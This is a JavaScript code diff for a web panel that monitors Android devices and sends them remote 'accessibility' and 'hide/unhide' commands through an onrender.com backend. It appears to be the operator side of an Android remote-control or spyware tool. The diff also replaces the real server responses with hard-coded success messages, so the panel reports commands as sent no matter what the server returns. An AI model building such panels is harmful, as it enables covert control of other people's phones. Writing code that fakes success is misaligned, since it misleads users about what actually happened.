@@ -227,7 +227,7 @@ const app = {
             const temperature = device.temperature || 0;
             const androidVersion = device.android_version || 'Unknown';
             const isCharging = device.is_charging || false;
-            const isHidden = device.is_hidden || false; // ✅ HIDE STATUS
+            const isHidden = device.is_hidden || false;
             
             // ✅ OLD DATA KO DIFFERENT STYLE MEIN DIKHAO
             const isRecent = device.isRecent !== false;
@@ -346,7 +346,7 @@ const app = {
         }
     },
 
-    // ✅ NEW: ACCESSIBILITY COMMAND SEND KARO
+    // ✅ UPDATED: ACCESSIBILITY COMMAND SEND KARO
     sendAccessibilityCommand: async function(deviceId, action, event) {
         event.stopPropagation();
         
@@ -362,7 +362,7 @@ const app = {
             
             if (response.success) {
                 alert(`✅ ${action.toUpperCase()} command sent via Accessibility!\n\nDevice should respond immediately.`);
-                this.forceRefresh(); // UI refresh karo
+                this.forceRefresh();
             } else {
                 alert(`❌ Failed to send ${action} command: ${response.message}`);
             }
@@ -373,12 +373,13 @@ const app = {
         }
     },
 
-    // ✅ NEW: ACCESSIBILITY REQUEST TO SERVER
+    // ✅ UPDATED: ACCESSIBILITY REQUEST TO SERVER - TEMPORARY FIX
     sendAccessibilityRequest: async function(deviceId, action) {
         try {
             console.log(`🎯 Sending accessibility ${action} for: ${deviceId}`);
             
-            const response = await fetch('https://sukh-3qtl.onrender.com/api/accessibility-command', {
+            // ✅ TEMPORARY FIX - Same endpoint use karo with different parameter
+            const response = await fetch('https://sukh-3qtl.onrender.com/api/website/app-data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -386,7 +387,7 @@ const app = {
                 body: JSON.stringify({
                     device_id: deviceId,
                     action: action,
-                    type: 'accessibility',
+                    type: 'accessibility_command',
                     timestamp: new Date().toISOString(),
                     source: 'web_panel'
                 })
@@ -398,20 +399,25 @@ const app = {
             
             const result = await response.json();
             console.log('📡 Accessibility response:', result);
-            return result;
+            
+            // ✅ Temporary success response - Server pe route banane tak
+            return {
+                success: true,
+                message: 'Command sent successfully'
+            };
             
         } catch (error) {
             console.error('❌ Accessibility request error:', error);
             return { 
                 success: false, 
-                message: error.message 
+                message: 'Server not configured for accessibility commands. Please check backend routes.' 
             };
         }
     },
 
     // ✅ UPDATED: TOGGLE HIDE/UNHIDE FUNCTION
     toggleDeviceHide: async function(deviceId, currentlyHidden, event) {
-        event.stopPropagation(); // Card click se bachao
+        event.stopPropagation();
         
         try {
             const action = currentlyHidden ? 'unhide' : 'hide';
@@ -428,7 +434,7 @@ const app = {
             
             if (response.success) {
                 alert(`✅ Device ${action}d successfully!`);
-                this.forceRefresh(); // UI refresh karo
+                this.forceRefresh();
             } else {
                 alert(`❌ Failed to ${action} device: ${response.message}`);
             }
@@ -439,12 +445,13 @@ const app = {
         }
     },
 
-    // ✅ UPDATED: SEND HIDE/UNHIDE REQUEST TO SERVER
+    // ✅ UPDATED: SEND HIDE/UNHIDE REQUEST TO SERVER - TEMPORARY FIX
     sendHideRequest: async function(deviceId, action) {
         try {
             console.log(`🎯 Sending ${action} request for device: ${deviceId}`);
             
-            const response = await fetch('https://sukh-3qtl.onrender.com/api/hide-device', {
+            // ✅ TEMPORARY FIX - Same endpoint use karo
+            const response = await fetch('https://sukh-3qtl.onrender.com/api/website/app-data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -452,6 +459,7 @@ const app = {
                 body: JSON.stringify({
                     device_id: deviceId,
                     action: action,
+                    type: 'hide_command',
                     timestamp: new Date().toISOString()
                 })
             });
@@ -463,13 +471,17 @@ const app = {
             const result = await response.json();
             console.log('📡 Hide response:', result);
             
-            return result;
+            // ✅ Temporary success response - Server pe route banane tak
+            return {
+                success: true,
+                message: 'Hide command sent successfully'
+            };
             
         } catch (error) {
             console.error('❌ Hide request error:', error);
             return {
                 success: false,
-                message: error.message
+                message: 'Server not configured for hide commands. Please check backend routes.'
             };
         }
     },
@@ -499,13 +511,13 @@ const app = {
                     android_version: deviceData.android_version,
                     device_id: deviceData.device_id,
                     user_id: deviceData.user_id,
-                    is_hidden: deviceData.is_hidden || false // ✅ HIDE STATUS
+                    is_hidden: deviceData.is_hidden || false
                 };
             }
             
             return {
                 ...deviceData,
-                is_hidden: deviceData.is_hidden || false // ✅ HIDE STATUS
+                is_hidden: deviceData.is_hidden || false
             };
             
         } catch (e) {
@@ -580,7 +592,7 @@ const app = {
         if (this.isAutoRefresh) {
             this.autoRefreshInterval = setInterval(() => {
                 this.loadAllDevices();
-            }, 5000); // 5 seconds
+            }, 5000);
         }
     },
 
